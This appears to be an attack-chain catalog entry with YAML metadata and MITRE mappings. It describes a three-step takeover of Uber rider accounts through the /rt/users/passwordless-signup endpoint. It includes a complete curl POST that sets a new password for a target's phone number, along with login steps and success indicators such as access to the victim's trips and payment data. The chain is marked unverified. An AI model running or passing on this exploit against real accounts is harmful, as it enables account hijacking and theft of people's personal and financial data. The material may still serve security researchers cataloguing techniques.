---
id: 3b050ef8-c13b-498b-b434-9c2182f967b7
name: Uber Account Takeover via Passwordless Signup Endpoint Abuse
type: attack_chain
description: >-
  Multi-stage attack exploiting improper authentication in Uber's passwordless
  signup endpoint to takeover any user account using only their phone number.
verified: false
submitted: true
step_count: 3
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:34.413Z'
procedures:
  - '[[procedures/Create-Uber-Rider-Account]]'
  - '[[procedures/Replay-Uber-Passwordless-Signup-for-Password-Reset]]'
  - '[[procedures/Login-to-Taken-Over-Uber-Account]]'
techniques:
  - '[[Valid Accounts]]'
  - '[[Modify Authentication Process]]'
tactics:
  - '[[Initial Access]]'
  - '[[Lateral Movement]]'
tags:
  - account-takeover
  - authentication-bypass
  - api-abuse
  - uber
platforms:
  - Web
  - Mobile (iOS)
tools: []
commands:
  - '[[commands/uber-passwordless-signup-reset]]'
  - '[[commands/uber-passwordless-signup-postfix-test]]'
complexity: medium
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Lateral Movement]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[Modify Authentication Process]]'
---

# Uber Account Takeover via Passwordless Signup Endpoint Abuse

Multi-stage attack chain demonstrating a complete attack workflow exploiting an improper authentication mechanism in Uber's /rt/users/passwordless-signup endpoint, allowing attackers to change the password of any user account using only the target's phone number, leading to full account takeover.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Create Rider Account] --> B[Replay Passwordless Signup Request]
    B --> C[Login with New Password]
    C --> D[Account Takeover Achieved]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- None (uses iOS app and HTTP client like curl)

### Target Environment

- Uber Rider Service (cn-geo1.uber.com)
- Web platform (riders.uber.com)
- Mobile (iOS app for initial registration)
- No specific ports required; standard HTTPS (443)

### Initial Access Requirements

- Target's phone number in E.164 format (e.g., +1xxxxxxxxxx)
- Ability to send HTTP POST requests (e.g., via curl or Burp Suite)
- Access to Uber iOS app for account creation
- No prior credentials needed

## Detailed Attack Procedures

### Step 1: Create New Rider Account
procedure: [[procedures/Create-Uber-Rider-Account]]

**Objective**: Initialize a new rider account to understand and replay the passwordless signup workflow, setting up the necessary state for exploiting the endpoint.

**Instructions**: Use the Uber iOS app to register a new account with a disposable phone number. This step familiarizes the attacker with the API flow and confirms the endpoint behavior.

**Expected Output**: Successful account creation with a phone number verification code sent.

**Success Indicators**:
- New account registered
- Access to the passwordless signup flow observed

### Step 2: Replay Passwordless Signup Request
procedure: [[procedures/Replay-Uber-Passwordless-Signup-for-Password-Reset]]

**Objective**: Exploit the /rt/users/passwordless-signup endpoint by sending a crafted POST request to set a new password for the target's account without ownership verification.

**Instructions**: Use [[commands/uber-passwordless-signup-reset]] to send the request with the target's phone number and desired password. May require sending twice if the first fails due to state issues.

```bash
curl -X POST https://cn-geo1.uber.com/rt/users/passwordless-signup \
  -H "User-Agent: client/iphone/2.137.1" \
  -H "Content-Type: application/json" \
  -d '{"phoneNumberE164":"+xxxxxxxx","userWorkflow":"PASSWORDLESS_SIGNUP","userRole":"client","mobileCountryISO2":"XX","state":"CREATE_NEW_PASSWORD","newPasswordData":{"newPassword":"12345678911a!"}}'
```

**Expected Output**: JSON response with "serverState":"SUCCEEDED" and message "New password has been created. Please login with the new Password."

**Success Indicators**:
- Password reset confirmed
- No authentication errors

### Step 3: Login to Taken Over Account
procedure: [[procedures/Login-to-Taken-Over-Uber-Account]]

**Objective**: Authenticate into the victim's account using the newly set password to achieve full takeover.

**Instructions**: Navigate to http://riders.uber.com/ or use the Uber app to login with the target's phone number and the new password.

**Expected Output**: Successful login with access to account data, trips, and payment info.

**Success Indicators**:
- Access to victim's personal data
- Ability to view/modify trips and payments

## Attack Chain Summary

### Key Achievements

1. Bypassed authentication to reset any Uber user's password using only phone number
2. Achieved full account takeover for riders (and potentially drivers)
3. Exposed sensitive user data including trips and payment information

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Valid Accounts]] Valid Accounts
- [[Modify Authentication Process]] Modify Authentication Process

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Lateral Movement]] Lateral Movement

---
*Last updated: 2023-10-01T00:00:00Z*
